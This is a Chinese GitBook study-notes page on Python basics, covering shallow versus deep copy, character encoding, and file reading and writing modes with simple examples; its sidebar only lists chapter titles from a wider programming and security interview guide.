
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>python · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../interview/python.html" />
    
    
    <link rel="prev" href="../tips.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../tips.html">
            
                <a href="../tips.html">
            
                    
                    tips
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter active" data-level="2.1" data-path="python.html">
            
                <a href="python.html">
            
                    
                    python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../interview/python.html">
            
                <a href="../interview/python.html">
            
                    
                    python后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="python_secure.html">
            
                <a href="python_secure.html">
            
                    
                    python安全
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../interview/python_secure.html">
            
                <a href="../interview/python_secure.html">
            
                    
                    python安全面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="java.html">
            
                <a href="java.html">
            
                    
                    java
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="javagui.html">
            
                <a href="javagui.html">
            
                    
                    java swing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.2" data-path="javafx.html">
            
                <a href="javafx.html">
            
                    
                    javafx
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.3" data-path="../interview/java.html">
            
                <a href="../interview/java.html">
            
                    
                    JAVA后端开发面试题
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3.4" data-path="s2.html">
            
                <a href="s2.html">
            
                    
                    s2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.4" data-path="golang.html">
            
                <a href="golang.html">
            
                    
                    golang
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.4.1" data-path="../interview/golang.html">
            
                <a href="../interview/golang.html">
            
                    
                    golang后端开发面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.5" data-path="../thinkphp/thinkphp6.html">
            
                <a href="../thinkphp/thinkphp6.html">
            
                    
                    thinkphp
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.5.1" data-path="../thinkphp/thinkphp面试题.html">
            
                <a href="../thinkphp/thinkphp面试题.html">
            
                    
                    thinkphp框架面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.6" data-path="../thinkphp/yii2.html">
            
                <a href="../thinkphp/yii2.html">
            
                    
                    yii2
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.7" data-path="../c#/c">
            
                <span>
            
                    
                    c#
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.7.1" data-path="../.net/.net面试题.html">
            
                <a href="../.net/.net面试题.html">
            
                    
                    .NET面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.8" data-path="c++.html">
            
                <a href="c++.html">
            
                    
                    c++
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.8.1" data-path="c++面试题.html">
            
                <a href="c++面试题.html">
            
                    
                    c++面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.9" data-path="../android/base.html">
            
                <a href="../android/base.html">
            
                    
                    安卓开发
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="algorithm.html">
            
                <a href="algorithm.html">
            
                    
                    算法基础
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../web/sql injection.html">
            
                <a href="../web/sql injection.html">
            
                    
                    sql注入
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../web/xss.html">
            
                <a href="../web/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../web/xxe.html">
            
                <a href="../web/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../neiwang/privilege.html">
            
                <a href="../neiwang/privilege.html">
            
                    
                    权限提升
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.2" data-path="../neiwang/information.html">
            
                <a href="../neiwang/information.html">
            
                    
                    横向移动，代理隧道
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.3" >
            
                <span>
            
                    
                    [权限维持]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.3.1" data-path="../thinkphp/pentest.html">
            
                <a href="../thinkphp/pentest.html">
            
                    
                    渗透面试题
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../reverse/pe.html">
            
                <a href="../reverse/pe.html">
            
                    
                    PE文件结构
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.2" data-path="../base/huibian2.html">
            
                <a href="../base/huibian2.html">
            
                    
                    汇编
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.3" data-path="../reverse/win32.html">
            
                <a href="../reverse/win32.html">
            
                    
                    win32
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.4" data-path="../reverse/mfc.html">
            
                <a href="../reverse/mfc.html">
            
                    
                    MFC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.5" data-path="../reverse/保护模式.html">
            
                <a href="../reverse/保护模式.html">
            
                    
                    保护模式
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="6.5.1" >
            
                <span>
            
                    
                    逆向基础面试题
            
                </span>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../neiwang/antikill.html">
            
                <a href="../neiwang/antikill.html">
            
                    
                    免杀
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../neiwang/antikillinter.html">
            
                <a href="../neiwang/antikillinter.html">
            
                    
                    反病毒/免杀面试题
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >python</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h4 id="&#x6DF1;&#x6D45;copy">&#x6DF1;&#x6D45;copy</h4>
<pre><code>&#x76F4;&#x63A5;&#x8D4B;&#x503C;&#x76F8;&#x7B49;:
&#x6BD4;&#x5982;list1 = list2, &#x8FD9;&#x662F;&#x5B8C;&#x5168;&#x628A;list2&#x7684;&#x5730;&#x5740;&#x7ED9;&#x4E86;list1&#xFF0C;&#x4E24;&#x4E2A;&#x6307;&#x5411;&#x5230;&#x7684;&#x540C;&#x4E00;&#x4E2A;&#x5730;&#x5740;
&#x6D45;copy:
&#x5982;&#x679C;&#x662F;&#x4E24;&#x5C42;&#x5217;&#x8868;&#xFF0C;&#x90A3;&#x4E48;&#x7B2C;&#x4E00;&#x5C42;&#x7684;&#x5217;&#x8868;id&#x5730;&#x5740;&#x53D8;&#x5316;&#xFF0C;&#x7B2C;&#x4E8C;&#x5C42;&#x4E0D;&#x53D8;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x6307;&#x53EF;&#x53D8;&#x53D8;&#x91CF;
&#x6DF1;copy:
&#x5982;&#x679C;&#x662F;&#x4E24;&#x5C42;&#x5217;&#x8868;&#xFF0C;&#x90A3;&#x4E48;&#x7B2C;&#x4E00;&#x5C42;&#x7684;&#x5217;&#x8868;id&#x5730;&#x5740;&#x53D8;&#x5316;&#xFF0C;&#x7B2C;&#x4E8C;&#x5C42;&#x4E5F;&#x53D8;&#x5316;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x662F;&#x6307;&#x53EF;&#x53D8;&#x53D8;&#x91CF;
</code></pre><h6 id="&#x76F4;&#x63A5;&#x8D4B;&#x503C;">&#x76F4;&#x63A5;&#x8D4B;&#x503C;</h6>
<p><a href="https://imgtu.com/i/bxwpfP" target="_blank"><img src="https://s1.ax1x.com/2022/03/15/bxwpfP.png" alt="bxwpfP.png"></a></p>
<h6 id="&#x6D45;copy">&#x6D45;copy</h6>
<p>&#x8FD9;&#x91CC;list1[2]&#x548C;list3[2]&#x5C31;&#x662F;&#x7B2C;&#x4E8C;&#x5C42;&#x5217;&#x8868;id&#x5730;&#x5740;&#xFF0C;&#x53D1;&#x73B0;&#x4ED6;&#x4EEC;&#x76F8;&#x540C;</p>
<p><a href="https://imgtu.com/i/bxdzFI" target="_blank"><img src="https://s1.ax1x.com/2022/03/15/bxdzFI.png" alt="bxdzFI.png"></a></p>
<h6 id="&#x6DF1;copy">&#x6DF1;copy</h6>
<p>&#x8FD9;&#x91CC;list1[2]&#x548C;list3[2]&#x5C31;&#x662F;&#x7B2C;&#x4E8C;&#x5C42;&#x5217;&#x8868;id&#x5730;&#x5740;&#xFF0C;&#x53D1;&#x73B0;&#x4ED6;&#x4EEC;&#x4E0D;&#x76F8;&#x540C;</p>
<p><a href="https://imgtu.com/i/bxw5ng" target="_blank"><img src="https://s1.ax1x.com/2022/03/15/bxw5ng.png" alt="bxw5ng.png"></a></p>
<p><img src="https://z3.ax1x.com/2021/10/12/5m3vhq.png" alt=""></p>
<p><a href="https://imgtu.com/i/HW6SzR" target="_blank"><img src="https://s4.ax1x.com/2022/02/16/HW6SzR.jpg" alt="HW6SzR.jpg"></a></p>
<p>&#x5185;&#x5B58;&#x56FA;&#x5B9A;&#x4F7F;&#x7528;unicode&#xFF0C;&#x548C;utf-8&#x8F6C;&#x6362;</p>
<p>&#x5F53;&#x5728;&#x5185;&#x5B58;&#x65F6;&#xFF0C;&#x5B57;&#x7B26;&#x90FD;&#x8F6C;&#x6362;&#x4E3A;unicode&#x7F16;&#x7801;&#xFF0C;&#x5728;&#x8FDB;&#x5165;&#x786C;&#x76D8;&#x65F6;&#xFF0C;&#x518D;&#x518D;&#x8F6C;&#x6362;&#x4E3A;utf-8&#x7F16;&#x7801;</p>
<p><code>#coding:gbk</code></p>
<h4 id="&#x6587;&#x4EF6;&#x64CD;&#x4F5C;">&#x6587;&#x4EF6;&#x64CD;&#x4F5C;</h4>
<p>&#x6587;&#x4EF6;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;/&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x64CD;&#x4F5C;&#x786C;&#x76D8;&#x7684;&#x4E00;&#x79CD;&#x865A;&#x62DF;&#x7684;&#x6982;&#x5FF5;/&#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x6237;/&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x5C06;&#x6570;&#x636E;&#x6C38;&#x4E45;</p>
<p>&#x4FDD;&#x5B58;&#x7684;&#x786C;&#x76D8;&#x4E2D;&#xFF0C;&#x5373;&#x64CD;&#x4F5C;&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x64CD;&#x4F5C;&#x786C;&#x76D8;&#xFF0C;&#x7528;&#x6237;/&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;&#x7684;&#x662F;&#x6587;&#x4EF6;&#xFF0C;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x6240;&#x6709;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x90FD;&#x662F;</p>
<p>&#x5728;&#x5411;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x53D1;&#x9001;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7531;&#x64CD;&#x4F5C;&#x5C06;&#x5176;&#x8F6C;&#x6362;&#x6210;&#x5177;&#x4F53;&#x7684;&#x786C;&#x76D8;&#x64CD;&#x4F5C;</p>
<pre><code class="lang-python">f=open(<span class="hljs-string">r&apos;aaa/a.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>) <span class="hljs-comment"># f&#x7684;&#x503C;&#x662F;&#x4E00;&#x79CD;&#x53D8;&#x91CF;&#xFF0C;&#x5360;&#x7528;&#x7684;&#x662F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;</span>
print(f)
<span class="hljs-comment"># 2&#x3001;&#x64CD;&#x4F5C;&#x6587;&#x4EF6;&#xFF1A;&#x8BFB;/&#x5199;&#x6587;&#x4EF6;&#xFF0C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x6587;&#x4EF6;&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x90FD;&#x662F;&#x5728;&#x5411;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x53D1;&#x9001;</span>
<span class="hljs-comment"># &#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x63A7;&#x5236;&#x786C;&#x76D8;&#x628A;&#x8F93;&#x5165;&#x8BFB;&#x5165;&#x5185;&#x5B58;&#x3001;&#x6216;&#x8005;&#x5199;&#x5165;&#x786C;&#x76D8;</span>
res=f.read()
print(type(res))
<span class="hljs-comment"># print(res)</span>
<span class="hljs-comment"># 3&#x3001;&#x5173;&#x95ED;&#x6587;&#x4EF6;</span>
f.close() <span class="hljs-comment"># &#x56DE;&#x6536;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;</span>

<span class="hljs-comment"># print(f)</span>
<span class="hljs-comment"># f.read() # &#x53D8;&#x91CF;f&#x5B58;&#x5728;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x80FD;&#x518D;&#x8BFB;&#x4E86;</span>

<span class="hljs-comment"># del f     # &#x56DE;&#x6536;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8D44;&#x6E90;</span>

<span class="hljs-comment"># with&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x6709;&#x4EBA;&#x5FD8;&#x8BB0;close&#x800C;&#x6765;&#x7684;                    &#x5F53;&#x4E00;&#x884C;&#x592A;&#x957F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;\&#x6362;&#x884C;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;a.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>) <span class="hljs-keyword">as</span> f1: <span class="hljs-comment"># f1=open(&apos;a.txt&apos;,mode=&apos;rt&apos;)</span>
    res=f1.read()
    print(res)
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># &#x6CA1;&#x6709;&#x6307;&#x5B9A;encoding&#x53C2;&#x6570;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4F1A;&#x4F7F;&#x7528;&#x81EA;&#x5DF1;&#x9ED8;&#x8BA4;&#x7684;&#x7F16;&#x7801;</span>
<span class="hljs-comment"># linux&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;utf-8</span>
<span class="hljs-comment"># windows&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;gbk</span>

&#x5F53;&#x5728;windows&#x4E0A;&#x6253;&#x5F00;&#x4E00;&#x4E2A;a.txt&#x6587;&#x4EF6;&#x65F6;&#xFF0C;a.txt&#x662F;&#x4EE5;utf<span class="hljs-number">-8</span>&#x5B58;&#x8FDB;&#x53BB;&#x7684;&#xFF0C;&#x5728;f.read()&#x6253;&#x5F00;&#x65F6;&#xFF0C;&#x4F1A;&#x628A;&#x90A3;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x8FDB;&#x884C;gbk(&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;)&#x89E3;&#x7801;&#xFF0C;&#x5F53;&#x7136;&#x4F1A;&#x4E71;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7528;encoding=<span class="hljs-string">&quot;utf-8&quot;</span>&#xFF0C;&#x544A;&#x8BC9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8981;&#x7528;utf<span class="hljs-number">-8</span>&#x89E3;&#x7801;&#xFF0C;&#x89E3;&#x7801;&#x6210;&#x529F;&#x540E;&#x518D;&#x6309;&#x7167;Unicode&#x7F16;&#x7801;
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;c.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    res=f.read() <span class="hljs-comment"># t&#x6A21;&#x5F0F;&#x4F1A;&#x5C06;f.read()&#x8BFB;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x89E3;&#x7801;&#x6210;unicode</span>
    print(res,type(res))

r&#xFF08;&#x9ED8;&#x8BA4;&#x7684;&#x64CD;&#x4F5C;&#x6A21;&#x5F0F;&#xFF09;&#xFF1A;&#x53EA;&#x8BFB;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x65F6;&#x62A5;&#x9519;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x65F6;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x8DF3;&#x5230;&#x5F00;&#x59CB;&#x4F4D;&#x7F6E;


w&#xFF1A;&#x53EA;&#x5199;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x65F6;&#x4F1A;&#x521B;&#x5EFA;&#x7A7A;&#x6587;&#x4EF6;&#xFF0C;&#x5F53;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x4F1A;&#x6E05;&#x7A7A;&#x6587;&#x4EF6;&#xFF0C;&#x6307;&#x9488;&#x4F4D;&#x4E8E;&#x5F00;&#x59CB;&#x4F4D;&#x7F6E;
<span class="hljs-comment"># &#x5F3A;&#x8C03;1</span>
<span class="hljs-comment"># &#x5728;&#x4EE5;w&#x6A21;&#x5F0F;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x5173;&#x95ED;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FDE;&#x7EED;&#x5199;&#x5165;&#xFF0C;&#x65B0;&#x7684;&#x5185;&#x5BB9;&#x603B;&#x662F;&#x8DDF;&#x5728;&#x65E7;&#x7684;&#x4E4B;&#x540E;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;d.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;1\n&apos;</span>)
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;2\n&apos;</span>)
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;3\n&apos;</span>)

<span class="hljs-comment"># &#x5F3A;&#x8C03;2</span>
<span class="hljs-comment"># &#x5982;&#x679C;&#x91CD;&#x65B0;&#x4EE5;w&#x6A21;&#x5F0F;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x4F1A;&#x6E05;&#x7A7A;&#x6587;&#x4EF6;&#x5185;&#x5BB9;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;d.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;1\n&apos;</span>)
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;d.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;2\n&apos;</span>)
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;d.txt&apos;</span>,mode=<span class="hljs-string">&apos;wt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x64E6;&#x52D2;3\n&apos;</span>)

a&#xFF1A;&#x53EA;&#x8FFD;&#x52A0;&#x5199;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x65F6;&#x4F1A;&#x521B;&#x5EFA;&#x7A7A;&#x6587;&#x6863;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x65F6;&#x6587;&#x4EF6;&#x6307;&#x9488;&#x4F1A;&#x76F4;&#x63A5;&#x8C03;&#x5230;&#x672B;&#x5C3E;
x&#xFF0C; &#x53EA;&#x5199;&#x6A21;&#x5F0F;&#x3010;&#x4E0D;&#x53EF;&#x8BFB;&#xFF1B;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x521B;&#x5EFA;&#xFF0C;&#x5B58;&#x5728;&#x5219;&#x62A5;&#x9519;&#x3011;
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;d.txt&apos;</span>, mode=<span class="hljs-string">&apos;x&apos;</span>, encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">&apos;&#x54C8;&#x54C8;&#x54C8;\n&apos;</span>)

b&#xFF1A;binary&#x6A21;&#x5F0F;
    <span class="hljs-number">1</span>&#x3001;&#x8BFB;&#x5199;&#x90FD;&#x662F;&#x4EE5;bytes&#x4E3A;&#x5355;&#x4F4D;
    <span class="hljs-number">2</span>&#x3001;&#x53EF;&#x4EE5;&#x9488;&#x5BF9;&#x6240;&#x6709;&#x6587;&#x4EF6;
    <span class="hljs-number">3</span>&#x3001;&#x4E00;&#x5B9A;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#xFF0C;&#x5373;&#x4E00;&#x5B9A;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;encoding&#x53C2;&#x6570;

&#x603B;&#x7ED3;&#xFF1A;
<span class="hljs-number">1</span>&#x3001;&#x5728;&#x64CD;&#x4F5C;&#x7EAF;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x65B9;&#x9762;t&#x6A21;&#x5F0F;&#x5E2E;&#x6211;&#x4EEC;&#x7701;&#x53BB;&#x4E86;&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;&#x7684;&#x73AF;&#x8282;&#xFF0C;b&#x6A21;&#x5F0F;&#x5219;&#x9700;&#x8981;&#x624B;&#x52A8;&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x65F6;t&#x6A21;&#x5F0F;&#x66F4;&#x4E3A;&#x65B9;&#x4FBF;
<span class="hljs-number">2</span>&#x3001;&#x9488;&#x5BF9;&#x975E;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF08;&#x5982;&#x56FE;&#x7247;&#x3001;&#x89C6;&#x9891;&#x3001;&#x97F3;&#x9891;&#x7B49;&#xFF09;&#x53EA;&#x80FD;&#x4F7F;&#x7528;b&#x6A21;&#x5F0F;
<span class="hljs-comment"># &#x5FAA;&#x73AF;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</span>
<span class="hljs-keyword">for</span> &#x548C; <span class="hljs-keyword">while</span>
&#x66F4;&#x63A8;&#x8350;<span class="hljs-keyword">while</span>&#x6A21;&#x5F0F;&#x5FAA;&#x73AF;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x63A7;&#x5236;&#x6BCF;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x7684;&#x6570;&#x636E;&#x91CF;
<span class="hljs-keyword">with</span> open(<span class="hljs-string">r&apos;test.jpg&apos;</span>,mode=<span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        res=f.read(<span class="hljs-number">1024</span>) <span class="hljs-comment"># 1024</span>
        <span class="hljs-keyword">if</span> len(res) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">break</span>
        print(len(res))

<span class="hljs-keyword">with</span> open(<span class="hljs-string">r&apos;g.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        print(len(line),line,end=<span class="hljs-string">&quot;&quot;</span>)
</code></pre>
<h5 id="&#x6587;&#x4EF6;&#x9AD8;&#x7EA7;&#x64CD;&#x4F5C;">&#x6587;&#x4EF6;&#x9AD8;&#x7EA7;&#x64CD;&#x4F5C;</h5>
<h6 id="&#x4E00;&#xFF1A;&#x8BFB;&#x76F8;&#x5173;&#x64CD;&#x4F5C;">&#x4E00;&#xFF1A;&#x8BFB;&#x76F8;&#x5173;&#x64CD;&#x4F5C;</h6>
<pre><code class="lang-python"><span class="hljs-comment"># 1&#x3001;readline&#xFF1A;&#x4E00;&#x6B21;&#x8BFB;&#x4E00;&#x884C;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">r&apos;g.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    res1=f.readline()
    res2=f.readline()
    print(res2)

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        line=f.readline()
        <span class="hljs-keyword">if</span> len(line) == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">break</span>
        print(line)

<span class="hljs-comment"># 2&#x3001;readlines&#xFF1A;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">r&apos;g.txt&apos;</span>,mode=<span class="hljs-string">&apos;rt&apos;</span>,encoding=<span class="hljs-string">&apos;utf-8&apos;</span>) <span class="hljs-keyword">as</span> f:
    res=f.readlines()
    print(res)

<span class="hljs-comment"># &#x5F3A;&#x8C03;&#xFF1A;</span>
<span class="hljs-comment"># f.read()&#x4E0E;f.readlines()&#x90FD;&#x662F;&#x5C06;&#x5185;&#x5BB9;&#x4E00;&#x6B21;&#x6027;&#x8BFB;&#x5165;&#x5185;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x5185;&#x5BB9;&#x8FC7;&#x5927;&#x4F1A;&#x5BFC;&#x81F4;&#x5185;&#x5B58;&#x6EA2;&#x51FA;&#xFF0C;&#x82E5;&#x8FD8;&#x60F3;&#x5C06;&#x5185;&#x5BB9;&#x5168;&#x8BFB;&#x5165;&#x5185;&#x5B58;</span>
</code></pre>
<h6 id="&#x4E00;&#xFF1A;&#x5199;&#x76F8;&#x5173;&#x64CD;&#x4F5C;">&#x4E00;&#xFF1A;&#x5199;&#x76F8;&#x5173;&#x64CD;&#x4F5C;</h6>
